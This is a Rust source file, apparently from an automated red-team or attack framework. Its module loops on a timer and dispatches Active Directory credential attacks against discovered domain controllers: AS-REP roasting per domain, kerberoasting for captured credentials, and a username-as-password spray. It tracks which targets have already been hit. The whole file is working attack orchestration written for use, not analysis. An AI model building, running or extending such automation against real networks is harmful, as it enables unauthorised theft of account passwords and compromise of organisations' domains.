//! auto_credential_access -- kerberoast, AS-REP roast, password spray.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::dispatcher::Dispatcher;
use crate::state::*;

/// Complex credential access automation: kerberoast, AS-REP roast, password spray.
/// Interval: 15s + Notify wake. Matches Python `_auto_credential_access`.
pub async fn auto_credential_access(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let notify = dispatcher.credential_access_notify.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(15));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = notify.notified() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // --- AS-REP Roast: one per domain ---
        let asrep_work: Vec<(String, String, ares_core::models::Credential)> = {
            let state = dispatcher.state.read().await;
            let cred = match state.credentials.first() {
                Some(c) => c.clone(),
                None => continue,
            };
            state
                .domains
                .iter()
                .filter(|d| !state.is_processed(DEDUP_ASREP_DOMAINS, d))
                .filter_map(|domain| {
                    let dc_ip = state.domain_controllers.get(domain).cloned()?;
                    Some((domain.clone(), dc_ip, cred.clone()))
                })
                .collect()
        };

        for (domain, dc_ip, cred) in asrep_work {
            match dispatcher
                .request_credential_access("asreproast", &dc_ip, &domain, &cred, 5)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, domain = %domain, "AS-REP roast dispatched");
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_ASREP_DOMAINS, domain.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_ASREP_DOMAINS, &domain)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch AS-REP roast"),
            }
        }

        // --- Kerberoast: one per domain + credential pair ---
        let kerberoast_work: Vec<(String, String, ares_core::models::Credential)> = {
            let state = dispatcher.state.read().await;
            state
                .credentials
                .iter()
                .filter(|c| !c.domain.is_empty())
                .filter_map(|cred| {
                    let dedup = format!(
                        "krb:{}:{}",
                        cred.domain.to_lowercase(),
                        cred.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_CRACK_REQUESTS, &dedup) {
                        return None;
                    }
                    let dc_ip = state
                        .domain_controllers
                        .get(&cred.domain.to_lowercase())
                        .cloned()?;
                    Some((dedup, dc_ip, cred.clone()))
                })
                .take(2)
                .collect()
        };

        for (dedup_key, dc_ip, cred) in kerberoast_work {
            match dispatcher
                .request_credential_access("kerberoast", &dc_ip, &cred.domain, &cred, 5)
                .await
            {
                Ok(Some(task_id)) => {
                    debug!(task_id = %task_id, domain = %cred.domain, "Kerberoast dispatched");
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_CRACK_REQUESTS, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_CRACK_REQUESTS, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch kerberoast"),
            }
        }

        // --- Password spray: username-as-password ---
        let spray_work: Vec<(String, String, String)> = {
            let state = dispatcher.state.read().await;
            state
                .users
                .iter()
                .filter(|u| !u.domain.is_empty())
                .filter_map(|u| {
                    let dedup =
                        format!("{}:{}", u.domain.to_lowercase(), u.username.to_lowercase());
                    if state.is_processed(DEDUP_USERNAME_SPRAY, &dedup) {
                        return None;
                    }
                    let dc_ip = state
                        .domain_controllers
                        .get(&u.domain.to_lowercase())
                        .cloned()?;
                    Some((dedup, dc_ip, u.domain.clone()))
                })
                .take(5)
                .collect()
        };

        // Submit one spray task per domain (batched)
        let mut sprayed_domains = std::collections::HashSet::new();
        for (_dedup_key, dc_ip, domain) in &spray_work {
            if sprayed_domains.contains(domain) {
                continue;
            }
            sprayed_domains.insert(domain.clone());

            let payload = json!({
                "technique": "username_as_password",
                "target_ip": dc_ip,
                "domain": domain,
            });

            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, 8)
                .await
            {
                Ok(Some(task_id)) => {
                    debug!(task_id = %task_id, domain = %domain, "Password spray dispatched");
                    // Mark all users in this domain's batch as processed
                    for (dk, _, d) in &spray_work {
                        if d == domain {
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_USERNAME_SPRAY, dk.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_USERNAME_SPRAY, dk)
                                .await;
                        }
                    }
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch password spray"),
            }
        }
    }
}
